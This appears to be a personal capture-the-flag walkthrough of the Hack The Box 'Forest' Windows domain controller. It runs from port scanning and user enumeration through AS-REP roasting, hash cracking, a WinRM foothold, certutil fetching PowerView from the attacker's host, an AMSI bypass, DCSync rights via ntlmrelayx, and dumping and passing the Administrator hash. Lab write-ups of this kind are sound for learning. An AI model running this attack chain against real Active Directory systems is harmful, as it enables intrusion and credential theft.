https://0xdf.gitlab.io/2020/03/21/htb-forest.html

### Nmap
nmap shows a lot of ports typical of Windows machines without the firewall:
```
root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.031s latency).
Not shown: 64742 closed ports, 769 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49697/tcp open  unknown
49898/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds

root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
Nmap scan report for 10.10.10.161
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-14T11:34:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-14T18:34:52
|_  start_date: 2019-10-14T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
```

### DNS
`htb.local` as the nmap resutl

```
dig @$IP htb.local
```

### RPC 445
`rpcclient -U "" -N $IP`

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
save as users.raw

###  Password Spraying - Making a Target User List (HTB academy)
##### Method 1 re-assembly rpcclient users list
```bash
cat users.raw | cut -d"]" -f1 | tr "[" " " | cut -d " " -f2 > users.txt

# optional sorting below 
sort -u users.txt | uniq
```
##### Method 2
```
crackmapexec smb $IP --users
```

##### Method 3. not too reckon
```
/opt/kerbrute_linux_amd64 userenum -d htb.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

### ASREPRoasting from Miscellaneous Misconfigurations (HTB academy)
##### Retrieving the AS-REP Using Kerbrute like the method 3 above
##### Hunting for Users with Kerberoast Pre-auth Not Required
```bash
impacket-GetNPUsers htb.local/ -dc-ip $IP -no-pass -usersfile users.txt 
```

##### Results
```bash
./GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ddc0281aae9de852e6a3742a9304eddd$5c4971d84cb7b3c3825e9e0ec037fcfe7bf1346b9548bf3e7c48fe97b30e81f2f1d2f88b44c27c46edf1aee4faf5dc2292d17a8080a0ee6d9b5d794f1783fbbbbf14d7f88b54bf3c1129a4e8f52ad6a0a2c6cd2a23b9a39d4ad53e5e686130d6a30c4d93a825b89455fb7fc86989d660540dd2d0117d145a30f7919317bd7cb46a6499bd07b92ff6bbf276c766888fa19fc497ff96fa02c55c71f18e5a0494e666686d03cb946b52280df55b071c9c46a87d0380ff286219656bf6614890efc46b0d5acf18d9406983e28235df521e77c04373a9538e641fba9bcca92f9f44a64c94ac0caf3e

$krb5asrep$23$svc-alfresco@HTB.LOCAL:7f409a8728db287dc66cebd404de8f76$a9b55fd6d781259c25c6d1d89ae6ec559d8b694ebba4c98700422d988a7165db39525ff0d646894a8cfb9a49d1f5e76c81eda2a3d5f31e9626eb6afdcf4e897bd03687156ea1d23f8f67132ec7d423bf66d1b9ef89a32aaa81fc36f8c9c3dd6426c53936c008834cd43d043063331fa2fa99a02cc35c597c57dc396f2f64d4f2d9d684e4c0e4e93d17e27f8dab24b00c313d373f1215baf78a537e476775f567b815b082f5ea0330bf63e18ff31b912f421707a550d69353c4163936b98edbd9e6badd2ea02e1627078897f403e3c36574c93a1ffb26e2d64d966d1350afff7e1f3821510acc
```

### Crack Hash
```
❯ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
```

svc-alfresco@HTB.LOCAL
s3rvice

### Foothold
```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice

# or

❯ crackmapexec winrm $IP -u svc-alfresco -p s3rvice
WINRM       10.129.232.105  5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.232.105  5985   FOREST           [*] http://10.129.232.105:5985/wsman
WINRM       10.129.232.105  5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### BloodHound since it's a domain controller

### DCSync Privileges needs PowerView.ps1
```bash
certutil -urlcache -f http://10.10.16.9/PowerView.ps1 PowerView.ps1

Import-Module .\PowerView.ps1
```

```bash
net group "Exchange Windows Permissions" svc-alfresco /add /domain
net localgroup "Remote Management Users" svc-alfresco /add /domain

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync # It will fail as defender stop importing the script(PowerView.ps1) here
```

##### menu -> Bypass-4MSI
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> Bypass-4MSI
[+] Success!
```

### Life saver ntlmrelayx.py since none of them working
```bash
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco

# It actually runs aclpwn.py aclpwn-20211009-001222.restore 
```
Although, i did run it twice to make it work
https://rootinjail.com/blog/post/htb-forest/

### Root
```bash
impacket-secretsdump -just-dc svc-alfresco:s3rvice@10.129.232.105

[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP
```